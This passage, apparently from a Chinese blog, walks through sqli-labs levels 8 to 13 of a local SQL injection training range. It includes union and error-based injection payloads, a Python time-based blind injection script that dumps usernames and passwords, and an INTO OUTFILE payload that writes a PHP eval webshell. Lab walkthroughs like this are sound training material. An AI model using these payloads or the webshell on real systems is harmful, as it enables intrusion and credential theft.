<p>使用Less-5的二分法爆破</p>
</li>
<li>
<p>利用outfile将查询结果写入文件,同时可以写shell (此处需要对mysql进行配置)</p>
</li>
</ol>
<p><code>docker exec -it xxx bash</code>进入容器</p>
<p><code>mysql -e &quot;show global variables like 'secure_file_priv';&quot;</code>检查<code>secure-file-priv</code>当前的值是否为空(不是<code>NULL</code>)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@2fef8c08e970:/# mysql -e &#34;show global variables like &#39;secure_file_priv&#39;;&#34;
</span></span><span class="line"><span class="cl">+------------------+-------+
</span></span><span class="line"><span class="cl">| Variable_name    | Value |
</span></span><span class="line"><span class="cl">+------------------+-------+
</span></span><span class="line"><span class="cl">| secure_file_priv |       |
</span></span><span class="line"><span class="cl">+------------------+-------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>同时在<code>/var/www/html</code>添加可写权限</p>
<p>传入<code>?id=1')) union select 1,2,'&lt;?php eval($_POST[_]);?&gt;' into outfile &quot;/var/www/html/shell.php&quot; --%20</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111071449768.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111071449768.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111071449768.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111071449768.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111071449768.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111071449768.png" /></p>
<h3 id="less-8">Less-8</h3>
<p>传入<code>?id=1'</code>无回显,传入<code>?id=1' or 1=1--%20</code>回显<code>You are in...........</code></p>
<p>脚本同Less-5</p>
<h3 id="less-9">Less-9</h3>
<p>无论传入什么都是返回<code>You are in...........</code>,根据提示闭合符号为<code>'</code>并&rsquo;使用延时盲注</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1/Less-9/&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_database_length</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=1&#39; and if(length(database())=</span><span class="si">%d</span><span class="s2">,sleep(5),1)-- &#34;</span> <span class="o">%</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_database_name</span><span class="p">(</span><span class="n">database_length</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">database_length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=1&#39; and if(ascii(substr(database(),</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">,sleep(5),1)-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_table_name</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=1&#39; and if(ascii(substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">,sleep(5),1)-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_column_name</span><span class="p">():</span>  <span class="c1"># id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=1&#39; and if(ascii(substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) ,</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">,sleep(5),1)-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_username</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=1&#39; and if(ascii(substr((select binary group_concat(username) from users) ,</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">,sleep(5),1)-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_password</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=1&#39; and if(ascii(substr((select binary group_concat(password) from users),</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">,sleep(5),1)-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get_database_name</span><span class="p">(</span><span class="n">get_database_length</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">get_table_name</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">get_column_name</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">get_username</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">get_password</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="less-10">Less-10</h3>
<p>将Less-9的单引号改成双引号</p>
<h3 id="less-11">Less-11</h3>
<p>POST传参<code>uname=admin'&amp;passwd=asdf</code></p>
<p>返回<code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'asdf' LIMIT 0,1' at line 1</code></p>
<p>推测其闭合方式为<code>'$uname' and '$passwd'</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=&#39;</span><span class="si">$uname</span><span class="s2">&#39; and password=&#39;</span><span class="si">$passwd</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$row</span><span class="o">=</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>POST传参<code>1' or 1=1;#</code></p>
<p>构成查询语句<code>SELECT username, password FROM users WHERE username='1' or 1=1;#' and password='123' LIMIT 0,1</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/image-20210507141417549.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/image-20210507141417549.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/image-20210507141417549.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/image-20210507141417549.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/image-20210507141417549.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/image-20210507141417549.png" /></p>
<p><code>mysqli_fetch_array</code>限制返回的行数</p>
<p>传入<code>uname=1' or 1=1 order by 3#&amp;passwd=123</code>得到<code>Unknown column '3' in 'order clause'</code>可知一共两列</p>
<p>传入<code>uname=1' and 1=1 union select database(),1#&amp;passwd=123</code>得到<code>Your Login name:security</code></p>
<blockquote>
<p>注意这里传入的是<code>and</code>,如果仍然传入<code>or</code>会返回<code>Your Login name:Dumb</code></p>
</blockquote>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/image-20210507143154610.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/image-20210507143154610.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/image-20210507143154610.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/image-20210507143154610.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/image-20210507143154610.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/image-20210507143154610.png" /></p>
<p>传入<code>uname=1' and 1=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=123</code></p>
<p>返回<code>Your Password:users,uagents,emails,referers</code></p>
<p>传入<code>uname=1' and 1=1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#&amp;passwd=123</code></p>
<p>返回<code>Your Password:id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code></p>
<p>传入<code>uname=1' and 1=1 union select 1,group_concat(username) from users#&amp;passwd=123</code></p>
<p>返回<code>Your Password:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</code></p>
<p>传入<code>uname=1' and 1=1 union select 1,group_concat(password) from users#&amp;passwd=123</code></p>
<p>返回<code>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</code></p>
<h3 id="less-12">Less-12</h3>
<p>把Less-11的单引号换成<code>&quot;)</code></p>
<h3 id="less-13">Less-13</h3>
<p>传入<code>uname=1')&amp;passwd=123</code></p>
<p>返回<code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '') and password=('123') LIMIT 0,1' at line 1</code></p>
<p>传入<code>uname=1') or 1=1#&amp;passwd=123</code>返回的<code>Content-Length</code>为<code>1493</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-28%20093349.png"
